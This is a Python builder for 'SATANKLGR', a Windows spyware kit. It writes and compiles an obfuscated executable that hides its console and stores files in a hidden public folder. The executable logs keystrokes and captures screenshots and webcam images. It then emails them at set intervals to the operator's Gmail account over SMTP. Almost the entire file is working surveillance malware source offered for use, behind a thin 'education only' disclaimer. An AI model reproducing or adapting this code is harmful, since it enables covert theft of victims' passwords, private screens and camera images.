from colorama import Fore
import os
import shutil

os.system("color")

def options():
    global send_screens, send_webcam, send_keystrokes, persistence, agreement, email1, password, interval
    send_screens = input(Fore.YELLOW+"Send screenshots [y/n]: "+Fore.WHITE).lower()
    send_webcam = input(Fore.YELLOW+"Send webcam [y/n]: "+Fore.WHITE).lower()
    send_keystrokes = input(Fore.YELLOW+"Send keystrokes [y/n]: "+Fore.WHITE).lower()
    email1 = input(Fore.YELLOW+"Enter your gmail"+Fore.LIGHTCYAN_EX+" (Do not use your basic gmail, only dedicated): "+Fore.WHITE)
    password  = input(Fore.YELLOW+"Enter your password for email: "+Fore.WHITE)
    interval = int(input(Fore.YELLOW+"Enter the interval of sending logs(in seconds): "+Fore.WHITE))

def agree():
    print(Fore.GREEN+"--------------------------------------------------------------")
    global agreement
    print(Fore.GREEN+"Email: ", Fore.WHITE+email1)
    print(Fore.GREEN+"Password: ", Fore.WHITE+password)
    print(Fore.GREEN+"Interval: ", Fore.WHITE+str(interval))
    print(Fore.GREEN+"Keystrokes: ", Fore.WHITE+send_keystrokes)
    print(Fore.GREEN+"Screenshots: ", Fore.WHITE+send_screens)
    print(Fore.GREEN+"Webcam: ", Fore.WHITE+send_webcam)
    print(Fore.GREEN+"--------------------------------------------------------------")
    agreement = input(Fore.YELLOW+"The information above is correct? [y/n]: ").lower()

def pyw_exe():
    try:
        print()
        print(Fore.YELLOW+"[*] Creating and writing to .py file...")
        print()
        print(Fore.GREEN+"[*] Done √")
        print()
        try:
            print(Fore.YELLOW+"[*] Compiling obfuscated .exe file...")
            print(Fore.RESET+"")
            os.system('pyarmor pack --clean -e "--onefile --icon default.ico" SATANKLGR.py')
            print()
            print(Fore.GREEN+"[*] The file SATANKLGR.exe is successfully compiled and saved in dist folder √")
            print()
            try:
                print(Fore.YELLOW+"[*] Removing needless foulders...")
                os.remove("SATANKLGR.py")
                shutil.rmtree("build")
                os.remove("SATANKLGR-patched.spec")
                os.remove("SATANKLGR.spec")
                print()
                print(Fore.GREEN+"[*] Foulders are successfully removed √...")
                print()
            except:
                print(Fore.RED+"[*] Impossible to remove foulders")
        except:
            print(Fore.RED+"[*] Impossible to compile and obfuscate .py file")
    except:
        print(Fore.RED+"[*] Impossible to compile .py file")
        print()

def exception():
    print()
    print(Fore.RED+"[*] Impossible to create and write to .py file")

def heading():
    print(Fore.RED + f'''

    ░██████╗░█████╗░████████╗░█████╗░███╗░░██╗██╗░░██╗██╗░░░░░░██████╗░██████╗░ ''',Fore.WHITE + "   [*] "+Fore.YELLOW+f"Written by FZGbzuw412",Fore.RED+f'''
    ██╔════╝██╔══██╗╚══██╔══╝██╔══██╗████╗░██║██║░██╔╝██║░░░░░██╔════╝░██╔══██╗
    ╚█████╗░███████║░░░██║░░░███████║██╔██╗██║█████═╝░██║░░░░░██║░░██╗░██████╔╝''',Fore.WHITE + "    [*] "+Fore.YELLOW+f"Only Satana can help you...", Fore.RED+f'''
    ░╚═══██╗██╔══██║░░░██║░░░██╔══██║██║╚████║██╔═██╗░██║░░░░░██║░░╚██╗██╔══██╗
    ██████╔╝██║░░██║░░░██║░░░██║░░██║██║░╚███║██║░╚██╗███████╗╚██████╔╝██║░░██║''', Fore.WHITE + "    [*] "+Fore.YELLOW+f"https://github.com/FZGbzuw412", Fore.RED+f'''

    ''',Fore.YELLOW + f'>> Do not forget to allow sending logs to your email >> https://www.google.com/settings/security/lesssecureapps')

heading()
print()

print(Fore.GREEN + f'''THIS SOFTWARE IS INTENDED ONLY FOR EDUCATION PURPOSES! DO NOT USE IT TO INFLICT 
DAMAGE TO ANYONE! USING MY APPLICATION YOU ARE AUTHOMATICALLY AGREE WITH ALL RULES AND
TAKE RESPONSIBITITY FOR YOUR ACTION! THE VIOLATION OF LAWS CAN CAUSE SERIOUS CONSEQUENCES!
THE DEVELOPER FZGbzuw412 ASSUMES NO LIABILITY AND IS NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE 
CAUSED BY THIS PROGRAM.''')
print()

def precaution():
    global response
    response = input(Fore.LIGHTWHITE_EX + f"""BEFORE USING SATANKLGR YOU MUST AGREE WITH POLICY
WRITE IN CAPITAL LETTERS 'I AGREE WITH RULES' (IF YOU WANT TO LEAVE THIS PAGE PRINT 'BYE'): """)
precaution()

while response !='I AGREE WITH RULES' and response !='BYE':
    print(Fore.RED + "INCORRECT WRITING. TRY AGAIN")
    precaution()

if response == 'I AGREE WITH RULES':
    print("----------------------------------")
    print("You agree with policy")
    print("----------------------------------")
    print(Fore.RESET + "Choose the options you want SATANKLGR to do\n")
    options()
    agree()
    while agreement == 'n':
        print("----------------------------------")
        options()
        agree()
    else:
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        if send_keystrokes == 'n' and send_webcam == 'y' and send_screens == 'y':
            try:
                with open("SATANKLGR.py", 'w') as f:
                    f.write(f'''import smtplib
import imghdr
from email.message import EmailMessage
import pyautogui
import cv2
import smtplib
import imghdr
import os
from cv2 import *
from datetime import datetime
import threading
from winreg import *
import ctypes
from os import path

directory = os.mkdir(r"C:\\Users\\Public\\Public 3D Objects")
ctypes.windll.kernel32.SetFileAttributesW(r"C:\\Users\\Public\\Public 3D Objects", 2)

Sender_Email = '''+f'"{email1}"'+f'''
Reciever_Email = Sender_Email
Password = '''+f'"{password}"'+f'''
interval = '''+str(interval)+f'''

files = [r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png", r"C:\\Users\\Public\\Public 3D Objects\\opencv0.png"]

class Screenshots:
    def __init__(self, email, password, interval):
        self.email = email
        self.password = password
        self.interval = interval

    def screenshot(self):
        try:
            global return_value, filename, file_type, i
            cam = cv2.VideoCapture(0)
            for i in range(1):
                return_value, image = cam.read()
                filename = cv2.imwrite(r"C:\\Users\\Public\\Public 3D Objects\\opencv0.png", image)
            del(cam)

            pyautogui.screenshot(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")

            timer = threading.Timer(self.interval, self.screenshot)
            timer.start()
        
            newMessage = EmailMessage()                         
            newMessage['Subject'] = "Check out the Logs!"
            newMessage['From'] = Sender_Email                   
            newMessage['To'] = Reciever_Email                   
            newMessage.set_content('New logs sent from your keylogger!')

            for file in files:
                with open(file, 'rb') as f:
                    file_data = f.read()
                    file_type = imghdr.what(f.name)
                    file_name = f.name

                newMessage.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                smtp.login(Sender_Email, Password)              
                smtp.send_message(newMessage)

            os.remove(r"C:\\Users\\Public\\Public 3D Objects\\opencv0.png")
            os.remove(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")

        except:
            pyautogui.screenshot(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")
            timer = threading.Timer(self.interval, self.screenshot)
            timer.start()
        
            newMessage = EmailMessage()                         
            newMessage['Subject'] = "Check out the Logs!"
            newMessage['From'] = Sender_Email                   
            newMessage['To'] = Reciever_Email                   
            newMessage.set_content('New logs sent from your keylogger!')

            with open(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png", 'rb') as f:
                file_data = f.read()
                file_type = imghdr.what(f.name)
                file_name = f.name

            newMessage.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                smtp.login(Sender_Email, Password)              
                smtp.send_message(newMessage)

            os.remove(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")

keylogger = Screenshots(Sender_Email, Password, interval)
keylogger.screenshot()
    '''), f.close()
            except:
                exception()
            pyw_exe()
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        elif send_keystrokes == 'y' and send_webcam == 'n' and send_screens == 'n':
            print()
            try:
                with open ('SATANKLGR.py', 'w') as f:
                    f.write(f'''import smtplib
import threading
from winreg import *
from threading import Timer
from datetime import datetime
import keyboard
import ctypes
from os import path

ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )

Sender_Email = '''+f'"{email1}"'+f'''
Reciever_Email = Sender_Email
Password = '''+f'"{password}"'+f'''
interval = '''+str(interval)+f'''

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = 'KeyLogger Started...'
        self.email = email
        self.password = password

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
        self.log += name

    def send_mail(self, email, password, message):
        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        self.send_mail(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def run(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

keylogger = KeyLogger(interval, Sender_Email, Password)
keylogger.run()
    '''), f.close()
            except:
                exception()
            pyw_exe()
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        elif send_keystrokes == 'y' and send_webcam == 'y' and send_screens == 'n':
            print()
            try:
                with open ('SATANKLGR.py', 'w') as f:
                    f.write(f'''import smtplib
import imghdr
from email.message import EmailMessage
import cv2
import os
import keyboard
from datetime import datetime
import threading
from winreg import *
from multiprocessing import Process
import ctypes
from os import path

ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )

directory = os.mkdir(r"C:\\Users\\Public\\Public 3D Objects")
ctypes.windll.kernel32.SetFileAttributesW(r"C:\\Users\\Public\\Public 3D Objects", 2)

Sender_Email = '''+f'"{email1}"'+f'''
Reciever_Email = Sender_Email
Password = '''+f'"{password}"'+f'''
interval = '''+str(interval)+f'''

class Screenshots:
    def __init__(self, email, password, interval):
        self.email = email
        self.password = password
        self.interval = interval

    def screenshot(self):
            try:
                global return_value, filename, file_type, i
                cam = cv2.VideoCapture(0)
                for i in range(1):
                    return_value, image = cam.read()
                    filename = cv2.imwrite(r"C:\\Users\\Public\\Public 3D Objects\\opencv0.png", image)
                del(cam)

                timer = threading.Timer(self.interval, self.screenshot)
                timer.start()
            
                newMessage = EmailMessage()                         
                newMessage['Subject'] = "Check out the Logs!"
                newMessage['From'] = Sender_Email                   
                newMessage['To'] = Reciever_Email                   
                newMessage.set_content('New logs sent from your keylogger!')

                with open(r"C:\\Users\\Public\\Public 3D Objects\\opencv0.png", 'rb') as f:
                    file_data = f.read()
                    file_type = imghdr.what(f.name)
                    file_name = f.name

                newMessage.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

                with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                    smtp.login(Sender_Email, Password)              
                    smtp.send_message(newMessage)

                os.remove(r"C:\\Users\\Public\\Public 3D Objects\\opencv0.png")
            except:
                pass

keylogger = Screenshots(Sender_Email, Password, interval)
keylogger.screenshot()

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
        self.log += name

    def send_mail(self, email, password, message):
        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        self.send_mail(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def run(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

keylogger = KeyLogger(interval, Sender_Email, Password)
keylogger.run()

if __name__ == '__main__':
    p = Process(target=KeyLogger, args=()).start()
    p3 = Process(target=Screenshots, args=()).start()
'''), f.close()
            except:
                exception()
            pyw_exe()
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        elif send_keystrokes == 'y' and send_webcam == 'y' and send_screens == 'y':
            try:
                with open("SATANKLGR.py", 'w') as f:
                    f.write(f'''import smtplib
import imghdr
from email.message import EmailMessage
import pyautogui
import cv2
import os
from cv2 import *
import keyboard
from datetime import datetime
import threading
from winreg import *
from multiprocessing import Process
import ctypes
from os import path

ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )

directory = os.mkdir(r"C:\\Users\\Public\\Public 3D Objects")
ctypes.windll.kernel32.SetFileAttributesW(r"C:\\Users\\Public\\Public 3D Objects", 2)

Sender_Email = '''+f'"{email1}"'+f'''
Reciever_Email = Sender_Email
Password = '''+f'"{password}"'+f'''
interval = '''+str(interval)+f'''

files = [r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png", r"C:\\Users\\Public\\Public 3D Objects\\opencv0.png"]

class Screenshots:
    def __init__(self, email, password, interval):
        self.email = email
        self.password = password
        self.interval = interval

    def screenshot(self):
        try:
            global return_value, filename, file_type, i
            cam = cv2.VideoCapture(0)
            for i in range(1):
                return_value, image = cam.read()
                filename = cv2.imwrite(r"C:\\Users\\Public\\Public 3D Objects\\opencv0.png", image)
            del(cam)

            pyautogui.screenshot(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")

            timer = threading.Timer(self.interval, self.screenshot)
            timer.start()
        
            newMessage = EmailMessage()                         
            newMessage['Subject'] = "Check out the Logs!"
            newMessage['From'] = Sender_Email                   
            newMessage['To'] = Reciever_Email                   
            newMessage.set_content('New logs sent from your keylogger!')

            for file in files:
                with open(file, 'rb') as f:
                    file_data = f.read()
                    file_type = imghdr.what(f.name)
                    file_name = f.name

                newMessage.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                smtp.login(Sender_Email, Password)              
                smtp.send_message(newMessage)

            os.remove(r"C:\\Users\\Public\\Public 3D Objects\\opencv0.png")
            os.remove(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")

        except:
            pyautogui.screenshot(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")
            timer = threading.Timer(self.interval, self.screenshot)
            timer.start()
        
            newMessage = EmailMessage()                         
            newMessage['Subject'] = "Check out the Logs!"
            newMessage['From'] = Sender_Email                   
            newMessage['To'] = Reciever_Email                   
            newMessage.set_content('New logs sent from your keylogger!')

            with open(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png", 'rb') as f:
                file_data = f.read()
                file_type = imghdr.what(f.name)
                file_name = f.name

            newMessage.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                smtp.login(Sender_Email, Password)              
                smtp.send_message(newMessage)

            os.remove(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")

keylogger = Screenshots(Sender_Email, Password, interval)
keylogger.screenshot()

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
        self.log += name

    def send_mail(self, email, password, message):
        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        self.send_mail(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def run(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

keylogger = KeyLogger(interval, Sender_Email, Password)
keylogger.run()

if __name__ == '__main__':
    p = Process(target=KeyLogger, args=()).start()
    p3 = Process(target=Screenshots, args=()).start()
'''), f.close()
            except:
                exception()
            pyw_exe()
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        elif send_keystrokes == 'n' and send_webcam == 'n' and send_screens == 'y':
            try:
                with open("SATANKLGR.py", 'w') as f:
                    f.write(f'''import smtplib
import imghdr
from email.message import EmailMessage
import pyautogui
import os
import threading
from winreg import *
import ctypes
from os import path

ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )

directory = os.mkdir(r"C:\\Users\\Public\\Public 3D Objects")
ctypes.windll.kernel32.SetFileAttributesW(r"C:\\Users\\Public\\Public 3D Objects", 2)

Sender_Email = '''+f'"{email1}"'+f'''
Reciever_Email = Sender_Email
Password = '''+f'"{password}"'+f'''
interval = '''+str(interval)+f'''

files = ["screenshot.png"]

class Screenshots:
    def __init__(self, email, password, interval):
        self.email = email
        self.password = password
        self.interval = interval

    def screenshot(self):
            pyautogui.screenshot(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")
            timer = threading.Timer(self.interval, self.screenshot)
            timer.start()
        
            newMessage = EmailMessage()                         
            newMessage['Subject'] = "Check out the Logs!"
            newMessage['From'] = Sender_Email                   
            newMessage['To'] = Reciever_Email                   
            newMessage.set_content('New logs sent from your keylogger!')

            with open(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png", 'rb') as f:
                global file_type
                file_data = f.read()
                file_type = imghdr.what(f.name)
                file_name = f.name

            newMessage.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                smtp.login(Sender_Email, Password)              
                smtp.send_message(newMessage)

            os.remove(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")

keylogger = Screenshots(Sender_Email, Password, interval)
keylogger.screenshot()
'''), f.close()
            except:
                exception()
            pyw_exe()
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        elif send_keystrokes == 'y' and send_webcam == 'n' and send_screens == 'y':
            try:
                with open ("SATANKLGR.py", 'w') as f:
                    f.write(f'''import smtplib
import imghdr
from email.message import EmailMessage
import pyautogui
import os
import keyboard
import threading
from winreg import *
from multiprocessing import Process
import ctypes
from datetime import datetime
from os import path

ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )

directory = os.mkdir(r"C:\\Users\\Public\\Public 3D Objects")
ctypes.windll.kernel32.SetFileAttributesW(r"C:\\Users\\Public\\Public 3D Objects", 2)

Sender_Email = '''+f'"{email1}"'+f'''
Reciever_Email = Sender_Email
Password = '''+f'"{password}"'+f'''
interval = '''+str(interval)+f'''

class Screenshots:
    def __init__(self, email, password, interval):
        self.email = email
        self.password = password
        self.interval = interval

    def screenshot(self):
        pyautogui.screenshot(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")
        timer = threading.Timer(self.interval, self.screenshot)
        timer.start()
    
        newMessage = EmailMessage()                         
        newMessage['Subject'] = "Check out the Logs!"
        newMessage['From'] = Sender_Email                   
        newMessage['To'] = Reciever_Email                   
        newMessage.set_content('New logs sent from your keylogger!')

        with open(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png", 'rb') as f:
            global file_type
            file_data = f.read()
            file_type = imghdr.what(f.name)
            file_name = f.name

        newMessage.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(Sender_Email, Password)              
            smtp.send_message(newMessage)

        os.remove(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")

keylogger = Screenshots(Sender_Email, Password, interval)
keylogger.screenshot()

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = 'KeyLogger Started...'
        self.email = email
        self.password = password

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
        self.log += name

    def send_mail(self, email, password, message):
        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        self.send_mail(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def run(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

keylogger = KeyLogger(interval, Sender_Email, Password)
keylogger.run()

if __name__ == '__main__':
    p = Process(target=KeyLogger, args=()).start()
    p3 = Process(target=Screenshots, args=()).start()
    '''), f.close()
            except:
                exception()
            pyw_exe()
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        elif send_keystrokes == 'n' and send_webcam == 'y' and send_screens == 'n':
            try:
                with open("SATANKLGR.py", 'w') as f:
                    f.write(f'''import smtplib
import imghdr
from email.message import EmailMessage
import os
import cv2
import threading
from winreg import *
import ctypes
from os import path

ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )

directory = os.mkdir(r"C:\\Users\\Public\\Public 3D Objects")
ctypes.windll.kernel32.SetFileAttributesW(r"C:\\Users\\Public\\Public 3D Objects", 2)

Sender_Email = '''+f'"{email1}"'+f'''
Reciever_Email = Sender_Email
Password = '''+f'"{password}"'+f'''
interval = '''+str(interval)+f'''

class Screenshots:
    def __init__(self, email, password, interval):
        self.email = email
        self.password = password
        self.interval = interval

    def screenshot(self):
        global return_value, filename, file_type, i
        cam = cv2.VideoCapture(0)
        for i in range(1):
            return_value, image = cam.read()
            filename = cv2.imwrite(r"C:\\Users\\Public\\Public 3D Objects\\opencv0.png", image)
        del(cam)

        timer = threading.Timer(self.interval, self.screenshot)
        timer.start()
        
        newMessage = EmailMessage()                         
        newMessage['Subject'] = "Check out the Logs!"
        newMessage['From'] = Sender_Email                   
        newMessage['To'] = Reciever_Email                   
        newMessage.set_content('New logs sent from your keylogger!')
            
        with open(r"C:\\Users\\Public\\Public 3D Objects\\opencv0.png", 'rb') as f:
            file_data = f.read()
            file_type = imghdr.what(f.name)
            file_name = f.name

        newMessage.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(Sender_Email, Password)              
            smtp.send_message(newMessage)

        os.remove(r"C:\\Users\\Public\\Public 3D Objects\\opencv0.png")
            
keylogger = Screenshots(Sender_Email, Password, interval)
keylogger.screenshot()
'''), f.close()
            except:
                exception()
            pyw_exe()
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        else:
            print("The compiling of exe file is impossible")
